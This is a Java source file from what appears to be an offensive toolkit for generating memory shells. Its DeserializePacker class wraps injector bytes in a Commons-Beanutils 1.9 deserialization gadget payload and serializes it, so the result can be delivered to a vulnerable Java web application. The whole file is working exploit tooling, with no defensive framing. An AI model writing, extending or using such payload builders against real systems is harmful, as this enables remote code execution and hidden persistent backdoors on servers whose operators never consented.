package com.reajason.javaweb.memsell.packer;

import com.reajason.javaweb.config.GenerateResult;
import com.reajason.javaweb.deserialize.CommonsBeanutils19;
import lombok.SneakyThrows;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class DeserializePacker implements Packer {
    @SneakyThrows
    public static byte[] serialize(Object obj) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        oos.close();
        return baos.toByteArray();
    }

    @Override
    @SneakyThrows
    public byte[] pack(GenerateResult generateResult) {
        Object payload = CommonsBeanutils19.getPayload(generateResult.getInjectorBytes());
        return serialize(payload);
    }
}